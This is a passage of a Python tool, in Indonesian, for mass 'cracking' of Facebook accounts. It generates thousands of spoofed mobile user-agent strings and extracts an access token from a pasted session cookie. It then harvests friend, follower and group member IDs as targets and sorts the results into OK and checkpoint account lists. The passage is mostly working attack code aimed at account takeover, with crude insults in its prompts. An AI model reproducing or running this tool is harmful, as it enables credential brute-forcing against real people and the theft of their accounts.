"Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-TECNO KG6k Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.010 UWS/ Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-Infinix X688B Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.020 UWS/ Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-Infinix X657B Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.020 UWS/ Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-meizu 17 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.121 MZBrowser/9.13.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.121 MZBrowser/9.12.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.13.110-2019112819 UWS/2.15.0.4 Mobile Safari/537.36 [ip:151.38.9.127]","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.13.110-2019112819 UWS/2.15.0.4 Mobile Safari/537.36 [ip:151.82.158.254]","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.13.110-2019112819 UWS/2.15.0.4 Mobile Safari/537.36 [ip:151.34.48.31]"]
	hir = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; zh-CN MZ-MEIZU 18 Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(100,150))} {str(rc(browser))}/9.{str(rr(1,20))}.1 Mobile safari/537.36"
	v1 = f"Mozilla/5.0 (Linux; Android {str(rr(9,10))}; meizu 17 Pro Build/{str(rc(build))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(73,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/349.0.0.39.470;]"
	v2 = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; meizu 17 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} Mobile Safari/537.36"
	v3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; zh-CN; MZ-meizu 17 Pro Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} MZBrowser/8.{str(rr(1,20))}.1 Mobile Safari/537.36"
	v4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; meizu 17 Pro Build/{str(rc(build))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} Mobile Safari/537.36 T7/{str(rr(11,19))}.{11,19} SP-engine/{str(rr(1,9))}.{str(rr(10,30))}.0 baiduboxapp/{str(rr(10,20))}.{str(rr(10,20))}.0.{str(rr(10,20))} (Baidu; P1 {str(rr(10,20))}) NABar/1.0"
	v5 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; zh-CN; meizu 17 Pro Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} Quark/{str(rr(1,9))}.{str(rr(1,9))}.0.{str(rr(100,200))} Mobile Safari/537.36"
	v6 = f"{str(rc(meizu))}"
	ngentid = random.choice([hir,v1,v2,v3,v4,v5,v6])
	ugen.append(ngentid)
	
for xl in range(5000):
	rr = random.randint; rc = random.choice
	build = ['MRA58K','UCC50Z']
	browser = ['HeyTapBrowser','MZBrowser']
	hir = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; zh-CN MZ-MEIZU 18 Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(100,150))} {str(rc(browser))}/9.{str(rr(1,20))}.1 Mobile safari/537.36"
	ugen.append(hir)
	
for xd in range(1000):
    build_nokiax = ['JDQ39','JZO54K']
    rr = random.randint; rc = random.choice
    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
    memekk = random.choice([ugent1, ugent2, ugent3])
    ugen.append(memekk)
	
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\03yo3[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m ' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
os.system('clear')
print('''
\33[1;96m╦  ┬┌─┐┌─┐┌┐┌┌─┐┬ \x1b[38;5;231mCODE BY : \x1b[1;92mMOUSE
\33[1;96m║  │└─┐├┤ │││└─┐│ \x1b[38;5;231mTEAM : CYBER NIGHTMARE
\33[1;96m╩═╝┴└─┘└─┘┘└┘└─┘┴ \x1b[38;5;231mWANGSAFF : 083109115523
    ''''')
#lesensi = input('\x1b[38;5;231mMasukan Lisensi : ')

#if lesensi not in 'JAVS-OWBY-PABE-WQJA-AKDB':
  #  print ('\x1b[1;91mLISENSI IN VALID')
#if lesensi == 'JAVS-OWBY-PABE-WQJA-AKDB':
#    print ('\x1b[1;92mLISENSI VALID')
#    back()
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO ]-----------------#
def banner():
	print(f'''\t{asu}                                             
| |__   __ _ _ __   __ _  | | ____ _ _   _
| '_ \ / _` | '_ \ / _` | | |/ / _` | | | |       pembuat : Code Bapakau
| |_) | (_| | |_) | (_| | |   < (_| | |_| |        versi : 1.1
| |_.__/ \__,_| .__/ \__,_| |_|\_\__,_|\__,_| 
            |_|                ''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# KONEKSI INTERNET BERMASALAH'
			lo = mark(li, style='yellow')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Masukkan Cookies : \x1b[1;92m ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1));bot()
		cok=open(".cok.txt", "w").write(cookie)
		cetak(nel(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} '));time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s \x1b[38;5;226mLOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		exit()
##def bot():
	#try:
		#requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	#except:
		#pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	gh = ' github.com/Anonymouse501'
	cetak(nel('\x1b[38;5;231mSelamat Datang [yellow]%s \x1b[38;5;208mNgentod'%(my_name)))
	print(f'[\x1b[38;5;226mID] \x1b[38;5;208mID Kamu :\x1b[38;5;46m '+str(my_id))
	print(f'[\x1b[38;5;226mIP] \x1b[38;5;208mIP Kmau  :\x1b[38;5;46m {ip}')
	print(f'[\x1b[38;5;226mGI] \x1b[38;5;208mGithub     :\x1b[38;5;46m{gh}')
	print('')
	cetak(nel('\x1b[38;5;231m[1]. \x1b[1;96mCrack Publik ')) 
	print('\x1b[38;5;231m[2]. \x1b[1;96mCrack Follower ')
	print('\x1b[38;5;231m[3]. \x1b[1;96mCrack Grup   ')
	print('\x1b[38;5;231m[4]. \x1b[1;96mCrack File	')
	print('\x1b[38;5;231m[5]. \x1b[1;96mHasil Crack  ')
	print('\x1b[38;5;196m[0]. \x1b[38;5;196mKeluar       ')
	_____fazry__sablenk_____ = input('\x1b[38;5;196m=\x1b[38;5;231m=\x1b[38;5;44m=> \x1b[38;5;231mPilih : ')
	if _____fazry__sablenk_____ in ['1']:
		dump_massal()
	elif _____fazry__sablenk_____ in ['2']:
		dump_follower()
	elif _____fazry__sablenk_____ in ['3']:
		grup()
	elif _____fazry__sablenk_____ in ['4']:
		crack_file()
	elif _____fazry__sablenk_____ in ['5']:
		result()
	elif _____fazry__sablenk_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('===> Pilih Yang Bener Asu ')
		back()
def error():
	cetak(nel(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')) 
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'>> 1. Hasil {h}OK{x} Anda ')
	print(f'>> 2. Hasil {k}CP{x} Anda ')
	print('>> 3. Kembali	')
	kz = input(f'\n====> Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('===> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('===> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n===> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('\x1b[38;5;196m=\x1b[38;5;231m=\x1b[38;5;44m=> \x1b[38;5;231mMau Berapa Target Om ? : '))
	except ValueError:
		print('[😒] Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('[😭] \x1b[38;5;226mGagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('\x1b[38;5;196m=\x1b[38;5;231m=\x1b[38;5;44m=> \x1b[38;5;231mMasukkan Idz Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('[😒] \x1b[38;5;226mSinyal Loh Kek Kontoll ')
			exit()
	try:
		print('')
		print(f'[😐] \x1b[38;5;46mTotal Idz Yang Terkumpul🔥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('[😒] \x1b[38;5;226mSinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'[😥]{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
	pil = input('>> Masukkan Idz Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'>> Total Idz :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('>> Koneksi Internet Bermasalah ')
		exit()
	except (KeyError,IOError):
		print('>> Gagal Mengambil Target ')
		exit()
#------------------[ CRACK-GRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"

def lah():
	print(f'\n{x}>> Total Idz Yang Terkumpul :{h} %s '%(len(id)))
	input(f'{x}>> [ {m}Klik Enter {x}] ')
	print('')
	pass
	setting()
def grup():
	print('')
	id = input(f'{x}>> Masukkan Username Atau Idz Grup : ')
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, 'html.parser')
	except requests.exceptions.ConnectionError:
		print('>> Sinyal Loo Kek Kontol ')
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print(" Terkena Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		grup()
	elif berr2=='Kesalahan':
		alvino_xy('>> Grup Tidak Di Temukan ')
		time.sleep(0.5)
		grup()
	else:pass
	print(f'{x}>> Nama Grup : {b}%s'%(berr2))
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print(" Anggota : -")
	else:
		print(f'{x}>> Anggota : {h}%s'%(ang[0]))
	grup1(url)
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{x}>> Sedang Mengumpulkan Idz ')
	print(f'>> Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
